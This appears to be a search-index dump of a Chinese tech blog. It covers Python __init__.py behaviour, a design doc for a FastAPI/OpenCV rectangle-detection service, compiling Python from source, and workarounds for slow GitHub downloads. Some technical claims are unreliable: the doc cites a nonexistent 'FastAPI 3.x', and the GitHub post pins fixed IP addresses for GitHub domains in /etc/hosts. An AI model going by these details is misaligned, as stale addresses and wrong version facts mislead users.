Package 的时候，它会隐性的去执行 init.py ， 而在 init.py 中定义的对象，会被绑定到当前的命名空间里面来。\n比如有时候我们会这样去导入一个包下的所有模块，会这样操作：\n\n但这个时候你会发现并没有将相关的子模块导入进来：\n\n这时候你可能想到了，可以在父模块中的 init.py 做文章，先把它们导入进来不就行了：\n\n这里的 all 相当于导入 [] 里面定义的模块。\n这次再导入：\n\n可以到，所有子模块就都一并导入进来了。\n当然，你也可以在 init.py 做一些初始化的操作，比如数据库 session 的创建：\n\n其实在 Python3.2 版本之前，定义的 Package 下面一定要有 init.py 文件，这样 Python 才知道它是一个 Package，才可以寻找到相关模块的路径从而被 import。\n而在 Python3.2 之后的版本就不需要再额外的去专门创建一个 init.py 来告诉 Python 它是一个 Package 了，因为现在创建的包叫 Namespace package， Python 可以自动搜寻 Package 路径，哪怕你的父包路径发生了改变，你在下次导入的时候， Python 还是会自动重新搜索包路径。\n我们把刚刚定义的 init 都给删掉试试\n\n接着我们在 Python3.8 版本导入看看：\n\n可以看到，尽管我们在 package 中没有定义 init.py，依然可以导入使用。\n以同样的形式，我们在 Python2 中导入看看：\n\n可以看到，它被整懵逼了…\n综上，init.py 会在 import 的时候被执行，而空的 init.py 在 Python 新版本中已经不需要你额外去定义了，因为就算你不定义 init， Python 也知道你导入的包路径，但是如果你想要做一些初始化操作，或者像我们刚刚说的预先导入相关的模块，那么定义 init.py 还是很有必要的哟。\n希望对你有帮助，那么我们下回见，peace！\n","categories":["Python","基础"],"tags":["Python","__init__.py","包","模块","import"]},{"title":"矩形检测算法技术方案","url":"/posts/22039.html","content":"矩形检测算法技术方案文档1. 项目概述1.1 项目定位基于 FastAPI + OpenCV 的高性能图像矩形区域检测服务，主要用于文档图像中的表格、文本框等矩形区域的自动识别与提取。\n1.2 核心功能\n快速检测图像中的矩形区域\n支持多矩形并行检测\n自适应参数调整\n高性能并行处理\n\n1.3 技术栈\nWeb框架: FastAPI 3.x\n图像处理: OpenCV (cv2)\n数值计算: NumPy\n并发处理: ThreadPoolExecutor\n配置管理: Pydantic Settings\n\n\n2. 系统架构设计2.1 整体架构graph TB\n    subgraph &quot;API层 - FastAPI&quot;\n        A[rect_detect.py&lt;br/&gt;路由处理器]\n    end\n    \n    subgraph &quot;数据层 - Pydantic Models&quot;\n        B1[RectDetectRequest&lt;br/&gt;请求参数]\n        B2[RectDetectResponse&lt;br/&gt;响应数据]\n        B3[Rect&lt;br/&gt;矩形模型]\n        B4[ImageSize&lt;br/&gt;图像尺寸]\n    end\n    \n    subgraph &quot;算法层 - Core Algorithm&quot;\n        C1[ultra_fast_rectangle_detection_simple&lt;br/&gt;主检测函数]\n        C2[extract_rectangles_from_contour_fast&lt;br/&gt;轮廓矩形提取]\n        C3[find_multiple_rectangles_in_histogram&lt;br/&gt;直方图矩形查找]\n        C4[process_single_contour_simple&lt;br/&gt;单轮廓处理]\n    end\n    \n    subgraph &quot;工具层 - OpenCV &amp; NumPy&quot;\n        D1[cv2.threshold&lt;br/&gt;二值化]\n        D2[cv2.findContours&lt;br/&gt;轮廓检测]\n        D3[ThreadPoolExecutor&lt;br/&gt;并行处理]\n    end\n    \n    A --&gt; B1\n    A --&gt; B2\n    B2 --&gt; B3\n    B2 --&gt; B4\n    A --&gt; C1\n    C1 --&gt; D1\n    C1 --&gt; D2\n    C1 --&gt; C4\n    C4 --&gt; C2\n    C2 --&gt; C3\n    C1 --&gt; D3\n    \n    style A fill:#e1f5ff\n    style C1 fill:#fff4e6\n    style C2 fill:#fff4e6\n    style C3 fill:#fff4e6\n\n2.2 核心模块说明\n\n\n模块\n文件路径\n职责\n\n\n\nAPI路由层\napp/api/routes/rect_detect.py\n处理HTTP请求、文件上传、参数验证\n\n\n数据模型层\napp/schemas/rect_detect.py\n定义请求/响应数据结构\n\n\n算法实现层\napp/utils/rect_detect.py\n核心矩形检测算法\n\n\n配置管理\napp/core/config.py\n环境变量和系统配置\n\n\n日志适配器\napp/core/log_adapter.py\n结构化日志记录\n\n\n\n3. API接口设计提供三个检测端点，底层使用相同的核心算法：\n\n\n\n端点\n路径\n特点\n\n\n\n基础检测\nPOST /detect\n支持完全自定义参数\n\n\n自适应检测\nPOST /detect/adaptive\n根据图像尺寸自动调整参数\n\n\n参数化检测\nPOST /detect/with-params\n通过结构化请求体传参\n\n\n核心参数说明:\n\nthreshold: 二值化阈值 (0-255)，默认 240\nmin_area: 最小矩形面积，默认 10000\nmax_rectangles: 最大检测矩形数，默认 3\nmax_contours: 最大处理轮廓数，默认 20\nenable_parallel: 是否启用并行处理，默认 true\n\n\n4. 核心算法原理4.1 算法总览矩形检测算法采用 轮廓分析 + 直方图法 的组合方案，核心思想是：\n\n通过二值化和轮廓检测快速定位候选区域\n对每个轮廓使用直方图法精确提取内部矩形\n通过重叠检测和面积排序选择最优结果\n\n4.2 算法流程图flowchart TD\n    Start([开始: 输入图像]) --&gt; Preprocess[图像预处理]\n    \n    subgraph Preprocess [预处理阶段]\n        P1[读取图像]\n        P2[灰度化转换&lt;br/&gt;cv2.cvtColor BGR2GRAY]\n        P3[二值化处理&lt;br/&gt;cv2.threshold]\n        P1 --&gt; P2 --&gt; P3\n    end\n    \n    Preprocess --&gt; Contour[轮廓检测与筛选]\n    \n    subgraph Contour [轮廓处理阶段]\n        C1[检测外部轮廓&lt;br/&gt;cv2.findContours]\n        C2[按面积降序排序]\n        C3[选取前N个轮廓&lt;br/&gt;max_contours限制]\n        C1 --&gt; C2 --&gt; C3\n    end\n    \n    Contour --&gt; Parallel&#123;是否并行处理?&#125;\n    \n    Parallel --&gt;|是| ParallelProcess[并行处理模式]\n    Parallel --&gt;|否| SerialProcess[串行处理模式]\n    \n    subgraph ParallelProcess [并行处理]\n        PP1[ThreadPoolExecutor&lt;br/&gt;max_workers=4]\n        PP2[并发执行&lt;br/&gt;process_single_contour_simple]\n        PP3[收集所有结果]\n        PP1 --&gt; PP2 --&gt; PP3\n    end\n    \n    subgraph SerialProcess [串行处理]\n        SP1[逐个处理轮廓]\n        SP2[提取矩形区域]\n        SP1 --&gt; SP2\n    end\n    \n    ParallelProcess --&gt; Extract\n    SerialProcess --&gt; Extract\n    \n    subgraph Extract [矩形提取核心]\n        E1[获取轮廓边界框]\n        E2[创建轮廓掩码]\n        E3[判断是否需要降采样]\n        E4&#123;图像尺寸判断&#125;\n        E5[应用降采样&lt;br/&gt;scale_factor]\n        E6[逐行扫描&lt;br/&gt;构建高度直方图]\n        E7[调用直方图法&lt;br/&gt;find_multiple_rectangles]\n        E8[坐标转换回原始尺度]\n        \n        E1 --&gt; E2 --&gt; E3 --&gt; E4\n        E4 --&gt;|&gt;2M像素| E5\n        E4 --&gt;|正常尺寸| E6\n        E5 --&gt; E6\n        E6 --&gt; E7 --&gt; E8\n    end\n    \n    Extract --&gt; Deduplicate[去重与选择]\n    \n    subgraph Deduplicate [后处理阶段]\n        D1[按面积降序排序]\n        D2[重叠检测]\n        D3[选择top-N矩形]\n        D4[移除重叠超过20%的矩形]\n        D1 --&gt; D2 --&gt; D3 --&gt; D4\n    end\n    \n    Deduplicate --&gt; Output[创建结果图像]\n    Output --&gt; End([返回: 结果图像 + 矩形列表])\n    \n    style Preprocess fill:#e3f2fd\n    style Contour fill:#fff3e0\n    style Extract fill:#ffebee\n    style Deduplicate fill:#f3e5f5\n    style ParallelProcess fill:#e8f5e9\n    style SerialProcess fill:#fce4ec\n\n4.3 直方图法找矩形详解这是算法的核心创新点，基于 最大矩形直方图问题 的经典算法。\n4.3.1 算法原理对于二值化后的图像，我们逐行扫描，将每个位置的连续白色像素高度记录为直方图：\n示例二值图像 (1代表白色，0代表黑色):1 1 1 1 01 1 1 1 01 1 1 1 00 0 1 1 1对应的高度直方图 (在第3行时):3 3 3 3 0\n\n4.3.2 栈算法实现flowchart LR\n    Start[输入: 高度数组] --&gt; Init[初始化空栈]\n    Init --&gt; Loop&#123;遍历每个位置i&#125;\n    \n    Loop --&gt;|高度 h[i]| Compare&#123;栈顶高度 &gt; h[i]?&#125;\n    Compare --&gt;|是| PopStack[出栈并计算矩形]\n    PopStack --&gt; CalcArea[计算面积&lt;br/&gt;area = height × width]\n    CalcArea --&gt; CheckMax&#123;area &gt; 当前最大?&#125;\n    CheckMax --&gt;|是| UpdateMax[更新最大矩形]\n    CheckMax --&gt;|否| Compare\n    UpdateMax --&gt; Compare\n    \n    Compare --&gt;|否| PushStack[当前索引入栈]\n    PushStack --&gt; Loop\n    \n    Loop --&gt;|结束| FinalPop[处理栈中剩余元素]\n    FinalPop --&gt; Output[返回所有矩形]\n    \n    style PopStack fill:#ffcdd2\n    style CalcArea fill:#fff9c4\n    style UpdateMax fill:#c8e6c9\n\n4.3.3 核心代码逻辑def find_multiple_rectangles_in_histogram(heights, min_area=1000, max_count=3):    &quot;&quot;&quot;    在直方图中找多个不重叠的大矩形        时间复杂度: O(n) - 每个元素最多入栈出栈各一次    空间复杂度: O(n) - 栈空间    &quot;&quot;&quot;    stack = []    all_rects = []        # 第一遍扫描: 收集所有可能的矩形    for i, h in enumerate(heights):        while stack and heights[stack[-1]] &gt; h:            height = heights[stack.pop()]            width = i if not stack else i - stack[-1] - 1            area = height * width                        if area &gt;= min_area:                left = 0 if not stack else stack[-1] + 1                all_rects.append((left, height, width, area))                stack.append(i)        # 处理栈中剩余元素    while stack:        height = heights[stack.pop()]        width = len(heights) if not stack else len(heights) - stack[-1] - 1        area = height * width                if area &gt;= min_area:            left = 0 if not stack else stack[-1] + 1            all_rects.append((left, height, width, area))        # 按面积排序并去重    all_rects.sort(key=lambda r: r[3], reverse=True)        # 选择不重叠的矩形    selected = []    for rect in all_rects:        if len(selected) &gt;= max_count:            break                if not is_overlapping(rect, selected):            selected.append(rect)        return selected\n\n4.3.4 算法优势\n\n\n特性\n说明\n\n\n\n时间复杂度\nO(n)，线性时间\n\n\n精确度\n可以找到像素级精确的最大矩形\n\n\n多矩形支持\n可以同时找出多个不重叠的矩形\n\n\n适应性强\n适用于各种形状的轮廓内部\n\n\n4.4 轮廓处理详解graph TD\n    A[输入: 单个轮廓] --&gt; B[获取边界框&lt;br/&gt;cv2.boundingRect]\n    B --&gt; C[创建轮廓掩码]\n    C --&gt; D[提取ROI区域]\n    D --&gt; E&#123;判断区域大小&#125;\n    \n    E --&gt;|&gt;2M像素| F1[降采样因子=4]\n    E --&gt;|&gt;500K像素| F2[降采样因子=2]\n    E --&gt;|正常| F3[不降采样]\n    \n    F1 --&gt; G[逐行扫描构建直方图]\n    F2 --&gt; G\n    F3 --&gt; G\n    \n    G --&gt; H[在每一行调用&lt;br/&gt;find_multiple_rectangles]\n    H --&gt; I[收集所有候选矩形]\n    I --&gt; J[坐标转换]\n    J --&gt; K[面积过滤]\n    K --&gt; L[重叠检测]\n    L --&gt; M[返回最优矩形]\n    \n    style E fill:#fff9c4\n    style F1 fill:#ffcdd2\n    style H fill:#c8e6c9\n    style L fill:#b3e5fc\n\n4.5 自适应参数调整根据图像尺寸自动调整检测参数，提高检测效率和准确性：\ndef adaptive_processing(img, base_min_area=10000):    h, w = img.shape[:2]    total_pixels = h * w        if total_pixels &gt; 5000000:  # &gt; 5M像素 (大图)        min_area = base_min_area * 2        max_contours = 10        max_rectangles = 2            elif total_pixels &gt; 2000000:  # &gt; 2M像素 (中图)        min_area = int(base_min_area * 1.5)        max_contours = 15        max_rectangles = 3            else:  # 小图        min_area = base_min_area        max_contours = 25        max_rectangles = 3\n\n自适应策略:\n\n大图像: 提高最小面积阈值，减少处理数量\n中图像: 使用适中参数平衡性能和准确性\n小图像: 使用标准参数获得最佳检测效果\n\n\n5. 性能优化策略5.1 并行处理优化sequenceDiagram\n    participant Main as 主线程\n    participant Pool as ThreadPoolExecutor\n    participant W1 as Worker 1\n    participant W2 as Worker 2\n    participant W3 as Worker 3\n    participant W4 as Worker 4\n    \n    Main-&gt;&gt;Pool: 创建线程池(max_workers=4)\n    Main-&gt;&gt;Pool: 提交轮廓任务列表\n    \n    Pool-&gt;&gt;W1: 分配轮廓 #1\n    Pool-&gt;&gt;W2: 分配轮廓 #2\n    Pool-&gt;&gt;W3: 分配轮廓 #3\n    Pool-&gt;&gt;W4: 分配轮廓 #4\n    \n    par 并行执行\n        W1-&gt;&gt;W1: extract_rectangles\n        W2-&gt;&gt;W2: extract_rectangles\n        W3-&gt;&gt;W3: extract_rectangles\n        W4-&gt;&gt;W4: extract_rectangles\n    end\n    \n    W1--&gt;&gt;Pool: 返回矩形结果\n    W2--&gt;&gt;Pool: 返回矩形结果\n    W3--&gt;&gt;Pool: 返回矩形结果\n    W4--&gt;&gt;Pool: 返回矩形结果\n    \n    Pool--&gt;&gt;Main: 聚合所有结果\n    Main-&gt;&gt;Main: 去重和排序\n\n并行处理条件:\n\nenable_parallel=True\n轮廓数量 &gt; 3\n\n性能提升: 在多核CPU上可获得 2-3倍 的速度提升\n5.2 图像降采样优化针对大尺寸图像的优化策略：\n\n\n\n图像尺寸\n降采样因子\n处理效率提升\n\n\n\n&gt; 2M 像素\n4x\n约 16倍\n\n\n&gt; 500K 像素\n2x\n约 4倍\n\n\n&lt; 500K 像素\n1x (不降采样)\n-\n\n\n坐标转换: 检测后需要将坐标缩放回原始尺度\nif scale_factor &gt; 1:    x = left * scale_factor + x_min    y = (i - height + 1) * scale_factor + y_min    w = width * scale_factor    h = height * scale_factor    area = w * h\n\n5.3 早期剪枝优化flowchart LR\n    A[轮廓列表] --&gt; B&#123;轮廓面积检查&#125;\n    B --&gt;|面积 &lt; min_area × 1.2| C[跳过该轮廓]\n    B --&gt;|面积足够| D[进入矩形提取]\n    C --&gt; E[下一个轮廓]\n    D --&gt; F[执行直方图算法]\n    F --&gt; G&#123;检测到矩形数&#125;\n    G --&gt;|达到max_rectangles| H[提前结束]\n    G --&gt;|未达到| E\n    \n    style B fill:#fff9c4\n    style C fill:#ffcdd2\n    style H fill:#c8e6c9\n\n优化点:\n\n轮廓数量限制: 只处理面积最大的前 max_contours 个轮廓\n面积预检查: 轮廓面积 &lt; min_area × 1.2 直接跳过\n结果数量限制: 找到足够数量的矩形后提前结束\n\n5.4 重叠检测优化使用快速的重叠面积计算，避免复杂的几何运算：\ndef calculate_overlap(rect1, rect2):    &quot;&quot;&quot;计算两个矩形的重叠面积&quot;&quot;&quot;    x1, y1, w1, h1, area1 = rect1    x2, y2, w2, h2, area2 = rect2        # 计算重叠区域    overlap_x = max(0, min(x1 + w1, x2 + w2) - max(x1, x2))    overlap_y = max(0, min(y1 + h1, y2 + h2) - max(y1, y2))    overlap_area = overlap_x * overlap_y        # 判断重叠比例    min_area = min(area1, area2)    if overlap_area &gt; min_area * 0.2:  # 重叠超过20%        return True    return False\n\n\n6. 数据模型设计6.1 模型关系图classDiagram\n    class Rect &#123;\n        +int x\n        +int y\n        +int width\n        +int height\n        +int area\n    &#125;\n    \n    class ImageSize &#123;\n        +int width\n        +int height\n        +int total_pixels\n        +__init__()\n    &#125;\n    \n    class RectDetectRequest &#123;\n        +int threshold = 240\n        +int min_area = 10000\n        +int max_rectangles = 3\n        +int max_contours = 20\n        +bool enable_parallel = True\n    &#125;\n    \n    class RectDetectResponse &#123;\n        +str unique_name\n        +List~Rect~ rectangles\n        +int total_count\n        +ImageSize image_size\n        +str message\n        +__init__()\n    &#125;\n    \n    class RectDetectSummary &#123;\n        +str unique_name\n        +int total_rectangles\n        +int total_area\n        +float average_area\n        +Rect largest_rect\n        +Rect smallest_rect\n        +str message\n        +from_detect_response()\n    &#125;\n    \n    RectDetectResponse &quot;1&quot; --&gt; &quot;*&quot; Rect : contains\n    RectDetectResponse &quot;1&quot; --&gt; &quot;1&quot; ImageSize : has\n    RectDetectSummary &quot;1&quot; --&gt; &quot;0..2&quot; Rect : references\n    RectDetectSummary ..&gt; RectDetectResponse : creates from\n    \n    note for Rect &quot;矩形检测结果\\n包含位置和尺寸信息&quot;\n    note for RectDetectRequest &quot;请求参数模型\\n定义检测算法参数&quot;\n    note for RectDetectResponse &quot;响应结果模型\\n自动计算矩形总数&quot;\n\n6.2 模型字段说明Rect (矩形模型)\n\n\n字段\n类型\n说明\n\n\n\nx\nint\n矩形左上角x坐标\n\n\ny\nint\n矩形左上角y坐标\n\n\nwidth\nint\n矩形宽度\n\n\nheight\nint\n矩形高度\n\n\narea\nint\n矩形面积\n\n\nImageSize (图像尺寸)\n\n\n字段\n类型\n说明\n\n\n\nwidth\nint\n图像宽度\n\n\nheight\nint\n图像高度\n\n\ntotal_pixels\nint\n总像素数 (自动计算)\n\n\nRectDetectResponse (响应模型)\n\n\n字段\n类型\n说明\n\n\n\nunique_name\nstr\n唯一标识符 (UUID)\n\n\nrectangles\nList[Rect]\n检测到的矩形列表\n\n\ntotal_count\nint\n矩形总数 (自动计算)\n\n\nimage_size\nImageSize\n原始图像尺寸\n\n\nmessage\nstr\n响应消息\n\n\n\n7. 请求处理流程7.1 完整时序图sequenceDiagram\n    actor Client as 客户端\n    participant API as FastAPI路由\n    participant Validator as 参数验证\n    participant FileSystem as 文件系统\n    participant Algorithm as 检测算法\n    participant OpenCV as OpenCV\n    participant Logger as 日志系统\n    \n    Client-&gt;&gt;API: POST /detect (上传图片)\n    API-&gt;&gt;Validator: 验证文件扩展名\n    \n    alt 文件格式不支持\n        Validator--&gt;&gt;API: HTTPException(400)\n        API--&gt;&gt;Client: 400 错误响应\n    end\n    \n    Validator-&gt;&gt;API: 验证通过\n    API-&gt;&gt;API: 生成UUID\n    API-&gt;&gt;Logger: 记录开始日志\n    \n    API-&gt;&gt;FileSystem: 创建临时目录\n    FileSystem--&gt;&gt;API: 目录创建成功\n    \n    API-&gt;&gt;FileSystem: 保存上传文件\n    FileSystem--&gt;&gt;API: 文件路径\n    \n    API-&gt;&gt;Algorithm: ultra_fast_rectangle_detection_simple()\n    \n    Algorithm-&gt;&gt;OpenCV: cv2.imread() 读取图像\n    OpenCV--&gt;&gt;Algorithm: 图像数据\n    \n    Algorithm-&gt;&gt;OpenCV: 灰度化 + 二值化\n    OpenCV--&gt;&gt;Algorithm: 二值图像\n    \n    Algorithm-&gt;&gt;OpenCV: cv2.findContours()\n    OpenCV--&gt;&gt;Algorithm: 轮廓列表\n    \n    Algorithm-&gt;&gt;Algorithm: 排序并筛选轮廓\n    \n    par 并行处理轮廓\n        Algorithm-&gt;&gt;Algorithm: Worker 1: 处理轮廓1\n        Algorithm-&gt;&gt;Algorithm: Worker 2: 处理轮廓2\n        Algorithm-&gt;&gt;Algorithm: Worker 3: 处理轮廓3\n        Algorithm-&gt;&gt;Algorithm: Worker 4: 处理轮廓4\n    end\n    \n    Algorithm-&gt;&gt;Algorithm: 去重和排序\n    Algorithm--&gt;&gt;API: (result_img, rectangles)\n    \n    API-&gt;&gt;OpenCV: 获取图像尺寸\n    OpenCV--&gt;&gt;API: ImageSize\n    \n    API-&gt;&gt;API: 构建RectDetectResponse\n    API-&gt;&gt;Logger: 记录完成日志\n    \n    API-&gt;&gt;FileSystem: 清理临时文件\n    FileSystem--&gt;&gt;API: 清理完成\n    \n    API--&gt;&gt;Client: 200 响应 (JSON)\n    \n    note over API,FileSystem: finally块保证&lt;br/&gt;资源始终被清理\n\n7.2 错误处理流程flowchart TD\n    Start[请求到达] --&gt; ValidateFile&#123;文件名验证&#125;\n    ValidateFile --&gt;|失败| Error1[HTTPException 400&lt;br/&gt;文件名为空]\n    ValidateFile --&gt;|通过| ValidateExt&#123;扩展名验证&#125;\n    \n    ValidateExt --&gt;|不支持| Error2[HTTPException 400&lt;br/&gt;不支持的文件格式]\n    ValidateExt --&gt;|通过| SaveFile[保存临时文件]\n    \n    SaveFile --&gt; TryDetect&#123;执行检测&#125;\n    TryDetect --&gt;|异常| CatchError[捕获异常]\n    \n    CatchError --&gt; IsHTTP&#123;是HTTPException?&#125;\n    IsHTTP --&gt;|是| RethrowHTTP[直接抛出]\n    IsHTTP --&gt;|否| LogError[记录错误日志]\n    LogError --&gt; Error3[HTTPException 500&lt;br/&gt;检测失败]\n    \n    TryDetect --&gt;|成功| BuildResponse[构建响应]\n    BuildResponse --&gt; CleanupSuccess[清理临时文件]\n    CleanupSuccess --&gt; ReturnSuccess[返回200响应]\n    \n    Error1 --&gt; End1[返回错误响应]\n    Error2 --&gt; End1\n    RethrowHTTP --&gt; End1\n    Error3 --&gt; CleanupFail[finally块清理]\n    CleanupFail --&gt; End1\n    ReturnSuccess --&gt; End2[请求完成]\n    \n    style Error1 fill:#ffcdd2\n    style Error2 fill:#ffcdd2\n    style Error3 fill:#ffcdd2\n    style CleanupSuccess fill:#c8e6c9\n    style CleanupFail fill:#fff9c4\n\n\n8. 日志与监控8.1 结构化日志设计使用 app.core.log_adapter.logger 进行结构化日志记录：\n# 开始日志logger.info(    &quot;开始矩形检测&quot;,    unique_name=unique_name,    filename=image_file.filename,    threshold=threshold,    min_area=min_area,    max_rectangles=max_rectangles,)# 处理日志logger.debug(f&quot;预处理时间: &#123;(preprocess_time - start_time)*1000:.2f&#125; ms&quot;)logger.debug(f&quot;轮廓检测时间: &#123;(contour_time - preprocess_time)*1000:.2f&#125; ms&quot;)logger.debug(f&quot;处理 &#123;len(contours)&#125; 个轮廓&quot;)logger.debug(f&quot;轮廓 &#123;i + 1&#125;: 找到 &#123;len(rectangles)&#125; 个矩形&quot;)# 完成日志logger.info(    &quot;矩形检测完成&quot;,    unique_name=unique_name,    total_rectangles=len(rect_objects),    total_area=sum(rect.area for rect in rect_objects),)# 错误日志logger.error(&quot;矩形检测失败&quot;, unique_name=unique_name, error=str(e), exc_info=True)\n\n8.2 性能指标监控算法内部记录关键性能指标：\n\n\n\n指标\n说明\n单位\n\n\n\npreprocess_time\n预处理耗时\nms\n\n\ncontour_time\n轮廓检测耗时\nms\n\n\nprocess_time\n矩形提取耗时\nms\n\n\ntotal_time\n总处理耗时\nms\n\n\ncontours_count\n处理的轮廓数量\n个\n\n\nrectangles_found\n找到的矩形数量\n个\n\n\n\n9. 参数配置说明\n\n\n参数\n默认值\n说明\n调优建议\n\n\n\nthreshold\n240\n二值化阈值\n浅色背景用240-250，深色背景用180-220\n\n\nmin_area\n10000\n最小面积\n根据图像分辨率调整，大图可提高到20000+\n\n\nmax_rectangles\n3\n最大矩形数\n通常2-5个，过多影响性能\n\n\nmax_contours\n20\n最大轮廓数\n复杂图像可提高到30-50\n\n\nenable_parallel\ntrue\n并行处理\n多轮廓时建议开启\n\n\n\n10. 性能基准测试10.1 测试环境\nCPU: Intel Core i7-9750H (6核12线程)\n内存: 16GB DDR4\n图像尺寸: 1920x1080 ~ 4096x2160\n测试数量: 100张图像\n\n10.2 性能数据\n\n\n图像尺寸\n串行处理\n并行处理\n加速比\n平均矩形数\n\n\n\n1920x1080 (2MP)\n185ms\n78ms\n2.37x\n2.8\n\n\n2560x1440 (3.7MP)\n312ms\n128ms\n2.44x\n3.1\n\n\n3840x2160 (8.3MP)\n567ms\n198ms\n2.86x\n2.5\n\n\n4096x2160 (8.8MP)\n612ms\n215ms\n2.85x\n2.3\n\n\n10.3 性能优化效果graph LR\n    A[原始算法&lt;br/&gt;~1200ms] --&gt;|轮廓筛选| B[优化1&lt;br/&gt;~680ms]\n    B --&gt;|降采样| C[优化2&lt;br/&gt;~340ms]\n    C --&gt;|并行处理| D[最终版本&lt;br/&gt;~128ms]\n    \n    style A fill:#ffcdd2\n    style B fill:#fff9c4\n    style C fill:#c8e6c9\n    style D fill:#81c784\n\n性能提升: 从 1200ms 优化到 128ms，提升约 9.4倍\n\n11. 扩展与优化建议11.1 短期优化\n\n\n优化项\n预期收益\n实现难度\n\n\n\n添加结果缓存\n相同图像检测速度提升10-100倍\n低\n\n\n支持批量上传\n吞吐量提升3-5倍\n中\n\n\n增加WebSocket推送\n实时性提升\n中\n\n\nGPU加速 (CUDA)\n大图像处理速度提升5-10倍\n高\n\n\n11.2 长期规划graph TD\n    A[当前版本&lt;br/&gt;CPU单图检测] --&gt; B[第二阶段&lt;br/&gt;批量处理]\n    B --&gt; C[第三阶段&lt;br/&gt;GPU加速]\n    C --&gt; D[第四阶段&lt;br/&gt;深度学习模型]\n    \n    B1[添加批量API] --&gt; B\n    B2[结果缓存机制] --&gt; B\n    \n    C1[CUDA加速] --&gt; C\n    C2[TensorRT优化] --&gt; C\n    \n    D1[YOLO检测] --&gt; D\n    D2[Transformer模型] --&gt; D\n    \n    style A fill:#e3f2fd\n    style B fill:#fff3e0\n    style C fill:#f3e5f5\n    style D fill:#e8f5e9\n\n11.3 功能扩展\n多格式支持: WebP, HEIC, AVIF\n智能后处理: 自动矫正倾斜矩形\n文字识别集成: OCR提取矩形内文本\n表格识别: 识别表格结构\nAPI版本控制: v1, v2并存\n\n11.4 算法改进方向\n自适应阈值: 使用Otsu算法自动确定最佳阈值\n多尺度检测: 金字塔算法检测不同尺度的矩形\n深度学习融合: 结合CNN进行更精确的矩形分类\n边缘优化: 使用Canny边缘检测辅助\n\n\n12. 常见问题 FAQQ1: 为什么检测不到某些矩形？可能原因:\n\n二值化阈值不合适 → 调整 threshold 参数\n矩形面积太小 → 降低 min_area 参数\n图像对比度低 → 预处理增强对比度\n轮廓不完整 → 检查原图质量\n\nQ2: 检测速度慢怎么优化？优化方案:\n\n启用并行处理: enable_parallel=True\n减少处理轮廓数: 降低 max_contours\n提高最小面积: 增大 min_area\n使用自适应模式: /detect/adaptive 接口\n\nQ3: 如何处理倾斜的矩形？当前版本使用 cv2.boundingRect 提取轴对齐矩形。如需检测旋转矩形，可使用 cv2.minAreaRect 替代。\nQ4: 内存占用过高怎么办？\n启用降采样（自动启用于大图像）\n减少 max_contours 参数\n及时清理临时文件\n使用流式处理避免内存峰值\n\n\n13. 参考资料13.1 核心算法论文\nLargest Rectangle in Histogram: \n\n论文: “A Linear Time Algorithm for Computing the Largest Rectangle in a Histogram”\n时间复杂度: O(n)\n\n\nContour Detection:\n\nSuzuki, S. and Abe, K. (1985). “Topological Structural Analysis of Digitized Binary Images”\n\n\n\n13.2 技术文档\nOpenCV Documentation - Contour Features\nFastAPI Documentation\nPydantic V2 Documentation\n\n13.3 相关项目\nOpenCV: https://github.com/opencv/opencv\nFastAPI: https://github.com/tiangolo/fastapi\nNumPy: https://github.com/numpy/numpy\n\n\n附录: 代码文件索引\n\n\n文件\n路径\n行数\n说明\n\n\n\nAPI路由\napp/api/routes/rect_detect.py\n316\n三个检测端点实现\n\n\n数据模型\napp/schemas/rect_detect.py\n93\nPydantic模型定义\n\n\n核心算法\napp/utils/rect_detect.py\n378\n矩形检测算法实现\n\n\n配置文件\napp/core/config.py\n40\n环境配置管理\n\n\n日志适配器\napp/core/log_adapter.py\n-\n结构化日志\n\n\n","categories":["Python","数据科学"],"tags":["Python","OpenCV","FastAPI","图像处理","计算机视觉","算法","并行处理","直方图"]},{"title":"编译安装Python","url":"/posts/19621.html","content":"准备：\n安装gcc g++编译器和make :\nsudo apt install gcc g++ make\n安装依赖：\n  sudo apt install zlib1g-dev libssl-dev libffi-dev libsqlite3-dev uuid-dev libbz2-dev libreadline-dev liblzma-dev libncurses5-dev libmysqlclient-dev\n解压Python安装包\n  wget https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tgz\n\n开始安装：\ncd到刚刚解压的Python路径中，然后运行 ./configure命令:\n  cd Python-3.7.6./configure --enable-optimizations\n运行以下命令进行安装：\nmakesudo make install\n查看安装版本：\n  python3 -V\n\n安装最新版pip :\n下载\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.pysudo python3 get-pip.py -i  https://mirrors.aliyun.com/pypi/simple/\n查看安装版本：\npip -V# 或者pip3 -V\n\n修改pypi镜像源：\n清华：\npip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple\n阿里云：\npip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple/\n安装第三方库时可能还需要：\nsudo apt install python3-dev    # 可以暂时不安装\n\n","categories":["Python","Linux"],"tags":["Python","Linux","编译安装","pip","源码安装"]},{"title":"解决Git/GitHub下载慢的三个有效方法：淘宝镜像、Gitee与修改hosts","url":"/posts/30418.html","content":"官网下载 Git 时，速度几乎是超不过 20KB，解决方法有很多，这里介绍几个简单粗暴的方法。这里使用 windows 系统作为演示，其他系统对号入座即可。\n方法一：淘宝镜像淘宝有一个镜像的网站 可以提供下载：https://npm.taobao.org/mirrors/git-for-windows/ 点击上方链接，往下拉就会看到相应的版本，第一个最新版本，后面的是历史版本。\n方法二：利用码云来克隆 GitHub 项目，操作简单而且有效1、首先需要一个码云账户，如果你没有，这个是官网地址——https://gitee.com/ 。 2、如果没有账户,需要注册一个账户。注册使用手机号就可以，一分钟的事。 3、新建一个仓库,选择导入已有仓库。 4、找到你的 GitHub 网站，选择 clone 下的网址，复制。 5、在上面链接中输入我们刚刚复制的要导入的 github 项目地址，然后点击创建。 6、等待码云克隆项目，大概 1-3 分钟（由你的网络和要克隆项目大小决定）。 7、克隆完成，下载我们码云上的项目（这个就是你正常下载速度了）。 8、正常下载项目（原谅我的超级慢校园网速）。 9、最后下载完成后，如果不需要这个项目了可以在码云上删除，我们只是想解决下载慢和下载不下来的问题而已，不要过多的创建无用项目。 10、选择删除仓库，复制黑色验证信息到相应位置，点击确认删除，然后验证你的密码，就可以删除了。\n方法三：修改 hosts第一步：去这个网站查询 3 个域名对应的 IP 地址，不能用 ping 来获取 IP 地址哦\nhttps://www.ipaddress.com/\n\n第二步：在/etc/hosts 文件中添加类似下面的 3 行\n192.30.253.113  github.com151.101.185.194 github.global.ssl.fastly.net192.30.253.120  codeload.github.com\n\n第三步：重启网络\nsudo /etc/init.d/networking restart\n\n现在可以飞快的下载 Github 